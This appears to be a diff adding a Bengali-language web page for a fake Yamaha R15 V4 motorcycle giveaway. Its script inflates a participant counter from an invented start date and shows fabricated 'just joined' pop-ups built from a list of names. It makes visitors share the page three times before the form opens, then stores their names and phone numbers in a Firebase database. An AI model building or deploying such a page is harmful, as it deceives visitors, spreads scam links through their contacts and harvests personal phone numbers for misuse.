@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>বাইক গিভঅ্যাওয়ে ২০২৬ | Yamaha R15 V4 জিতুন</title>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;600;700&family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/all.min.css">
+    
+    <style>
+        :root {
+            --primary: #2563eb;
+            --secondary: #facc15;
+            --dark: #0f172a;
+            --glass: rgba(255, 255, 255, 0.1);
+            --gradient: linear-gradient(135deg, #020617 0%, #1e293b 100%);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Hind Siliguri', 'Poppins', sans-serif;
+        }
+
+        body {
+            background: var(--gradient);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Step Visibility */
+        .step {
+            display: none;
+            animation: fadeIn 0.6s ease-in-out forwards;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .card {
+            background: var(--glass);
+            backdrop-filter: blur(15px);
+            padding: 30px;
+            border-radius: 24px;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            margin-top: 20px;
+        }
+
+        .bike-img {
+            width: 100%;
+            max-width: 450px;
+            margin: 20px 0;
+            filter: drop-shadow(0 15px 30px rgba(0,0,0,0.5));
+            animation: float 4s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        h1 { font-size: 2.2rem; color: var(--secondary); margin-bottom: 10px; }
+        p { opacity: 0.9; margin-bottom: 20px; }
+
+        /* Progress Bar */
+        .progress-container { margin: 25px 0; text-align: left; }
+        .progress-bar {
+            height: 12px;
+            background: #334155;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+        #progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #2563eb, #60a5fa);
+            transition: width 0.4s ease;
+        }
+
+        .btn-main {
+            background: var(--primary);
+            color: white;
+            padding: 16px 32px;
+            border-radius: 50px;
+            border: none;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+        }
+
+        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(37, 99, 235, 0.4); }
+
+        .share-btn {
+            padding: 14px;
+            border-radius: 15px;
+            border: none;
+            color: white;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            margin-bottom: 10px;
+            width: 100%;
+        }
+
+        .fb { background: #1877f2; }
+        .wa { background: #25d366; }
+        .ms { background: #0084ff; }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.2);
+            background: rgba(0,0,0,0.3);
+            color: white;
+            margin-bottom: 15px;
+            font-size: 1rem;
+        }
+
+        /* Live Notification Pop-up */
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            left: -300px;
+            background: white;
+            color: #333;
+            padding: 12px 20px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 9999;
+            transition: left 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+        }
+
+        .notification.show { left: 20px; }
+        .notification i { color: #25d366; font-size: 20px; }
+        .notification .text { font-size: 0.9rem; font-weight: 600; }
+
+        .success-bike {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 15px;
+            margin: 15px 0;
+            border: 2px solid var(--secondary);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Live Submission Notification -->
+    <div id="live-toast" class="notification">
+        <i class="fas fa-check-circle"></i>
+        <div class="text" id="toast-text">আব্দুল্লাহ এইমাত্র অংশ নিয়েছেন</div>
+    </div>
+
+    <div class="container">
+        <!-- STEP 1: WELCOME -->
+        <div id="step1" class="step active">
+            <h1>ব্র্যান্ড নিউ বাইক জিতুন!</h1>
+            <p>২০২৬ সালের মেগা গিভঅ্যাওয়েতে অংশ নিয়ে জিতে নিন Yamaha R15 V4</p>
+            
+            <img src="https://raw.githubusercontent.com/the-m-r-p/images/main/r15v4-blue.png" alt="R15 V4" class="bike-img">
+
+            <div class="card">
+                <h3>অংশগ্রহণ করেছেন: <span id="participant-count" style="color: var(--secondary);">১২,৫৪০</span> জন</h3>
+                <p>আপনি কি আপনার স্বপ্নের বাইকটি জিততে চান?</p>
+                <button class="btn-main" onclick="nextStep(2)">শুরু করুন <i class="fas fa-arrow-right"></i></button>
+            </div>
+        </div>
+
+        <!-- STEP 2: SHARE -->
+        <div id="step2" class="step">
+            <h1>ধাপ ২: বন্ধুদের জানান</h1>
+            <p>আপনার ৩ জন বন্ধুকে শেয়ার করলেই এন্ট্রি ফর্মটি ওপেন হবে।</p>
+            
+            <div class="card">
+                <div class="progress-container">
+                    <p id="progress-text">শেয়ার সম্পন্ন: ০/৩</p>
+                    <div class="progress-bar"><div id="progress-fill"></div></div>
+                </div>
+
+                <button onclick="handleShare('fb')" class="share-btn fb"><i class="fab fa-facebook"></i> Facebook-এ শেয়ার</button>
+                <button onclick="handleShare('ms')" class="share-btn ms"><i class="fab fa-facebook-messenger"></i> Messenger-এ শেয়ার</button>
+                <button onclick="handleShare('wa')" class="share-btn wa"><i class="fab fa-whatsapp"></i> WhatsApp-এ শেয়ার</button>
+            </div>
+        </div>
+
+        <!-- STEP 3: FORM -->
+        <div id="step3" class="step">
+            <h1>ধাপ ৩: ফর্ম পূরণ করুন</h1>
+            <div class="card">
+                <form id="giveaway-form">
+                    <input type="text" id="name" placeholder="আপনার পূর্ণ নাম" required>
+                    <input type="tel" id="phone" placeholder="মোবাইল নম্বর" required>
+                    <button type="submit" class="submit-btn btn-main" id="submit-btn">সাবমিট করুন</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- STEP 4: SUCCESS & GREETINGS -->
+        <div id="step4" class="step">
+            <div class="card" style="border: 2px solid #4ade80;">
+                <h1 style="color: #4ade80;">অভিনন্দন ও শুভেচ্ছা!</h1>
+                <p>আপনার আবেদনটি সফলভাবে জমা হয়েছে। আমাদের গিভঅ্যাওয়েতে অংশগ্রহণ করার জন্য আপনাকে আন্তরিক ধন্যবাদ।</p>
+                
+                <img src="https://raw.githubusercontent.com/the-m-r-p/images/main/r15v4-blue.png" class="success-bike" alt="Prize Bike">
+                
+                <div style="background: rgba(255, 255, 255, 0.05); padding: 15px; border-radius: 15px; margin-top: 10px;">
+                    <p style="margin-bottom: 5px;">বিজয়ীর নাম আমাদের অফিসিয়াল ফেসবুক পেজে ঘোষণা করা হবে। আপনার জন্য শুভকামনা রইলো!</p>
+                </div>
+
+                <button class="btn-main" style="margin-top: 20px; background: #4ade80; color: #000;" onclick="location.reload()">শেষ করুন</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.12.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.12.1/firebase-database-compat.js"></script>
+
+    <script>
+        // Firebase Config
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_PROJECT.firebaseapp.com",
+            databaseURL: "https://YOUR_PROJECT-default-rtdb.firebaseio.com",
+            projectId: "YOUR_PROJECT",
+            storageBucket: "YOUR_PROJECT.appspot.com",
+            messagingSenderId: "YOUR_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Multi-step Logic
+        function nextStep(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        // Participant Counter
+        // ২. লাইভ পার্টিসিপেন্ট কাউন্টার (স্মার্ট লজিক - যা কখনো কমবে না)
+function initParticipantCounter() {
+    // গিভঅ্যাওয়ে শুরু হওয়ার একটি কাল্পনিক সময় (যেমন: ১ জানুয়ারি ২০২৬)
+    const startDate = new Date("January 1, 2026 00:00:00").getTime();
+    const now = new Date().getTime();
+    
+    // শুরু থেকে এখন পর্যন্ত কত সেকেন্ড পার হয়েছে তা বের করা
+    const secondsPassed = Math.floor((now - startDate) / 1000);
+    
+    // প্রতি ১০ সেকেন্ডে গড়ে ১ জন করে ইউজার বাড়বে এমন লজিক
+    // ১২৫৪০ হলো আমাদের বেস নম্বর (Base Number)
+    let currentCount = 12540 + Math.floor(secondsPassed / 10); 
+
+    const counterElement = document.getElementById('participant-count');
+    
+    // শুরুতে সংখ্যাটি দেখানো
+    counterElement.innerText = currentCount.toLocaleString('bn-BD');
+
+    // পেজ ওপেন থাকা অবস্থায় প্রতি ৫ সেকেন্ডে ১-২ জন করে বাড়ানো (অ্যানিমেশন ফিল দেওয়ার জন্য)
+    setInterval(() => {
+        currentCount += Math.floor(Math.random() * 2) + 1;
+        counterElement.innerText = currentCount.toLocaleString('bn-BD');
+    }, 5000);
+}
+
+// ফাংশনটি কল করা
+initParticipantCounter();
+        // Live Popup Notification Logic
+        const names = ["আব্দুর রহিম", "সুমন আহমেদ", "তানজিল হোসেন", "মিজানুর রহমান", "সাদিয়া ইসলাম", "ফাহিম মুনতাসির", "জেরিন আক্তার", "নাহিদ হাসান", "জসিম উদ্দিন"];
+        function showNotification() {
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            const toast = document.getElementById('live-toast');
+            document.getElementById('toast-text').innerText = randomName + " এইমাত্র অংশ নিয়েছেন";
+            
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+        // পপআপ প্রতি ৮ সেকেন্ড পর পর আসবে
+        setInterval(showNotification, 8000);
+
+        // Share Tracking
+        let shares = 0;
+        function handleShare(platform) {
+            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(window.location.href), '_blank');
+            shares++;
+            const fill = document.getElementById('progress-fill');
+            const text = document.getElementById('progress-text');
+            
+            let percent = (shares / 3) * 100;
+            fill.style.width = Math.min(percent, 100) + "%";
+            text.innerText = `শেয়ার সম্পন্ন: ${Math.min(shares, 3)}/৩`;
+
+            if(shares >= 3) {
+                setTimeout(() => nextStep(3), 1000);
+            }
+        }
+
+        // Form Submit
+        document.getElementById('giveaway-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submit-btn');
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+
+            btn.disabled = true;
+            btn.innerText = "অপেক্ষা করুন...";
+
+            database.ref('entries/' + phone.replace(/[^0-9]/g, "")).set({
+                name: name,
+                phone: phone,
+                time: new Date().toLocaleString('bn-BD')
+            }).then(() => {
+                nextStep(4);
+            }).catch(() => {
+                alert("সমস্যা হয়েছে, আবার চেষ্টা করুন।");
+                btn.disabled = false;
+                btn.innerText = "সাবমিট করুন";
+            });
+        });
+    </script>
+</body>
+  </html>
